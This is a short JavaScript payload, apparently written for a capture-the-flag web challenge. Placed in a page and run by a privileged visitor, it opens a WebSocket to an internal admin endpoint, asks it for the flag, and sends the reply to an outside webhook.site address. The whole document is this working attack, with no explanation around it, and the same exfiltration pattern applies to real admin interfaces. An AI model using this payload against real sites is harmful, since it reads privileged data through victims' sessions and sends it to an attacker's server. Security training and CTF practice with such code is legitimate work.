<script>
    const ws = new WebSocket("ws://web:8080/admin/ws");

    const interval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send("flag");
            clearInterval(interval);
        }
    }, 30);

    ws.onmessage = e => {
        fetch("https://webhook.site/76ef89e7-5bee-4a8b-a9d7-a5f235d6b828/?flag=" + encodeURIComponent(e.data));
    };
</script>
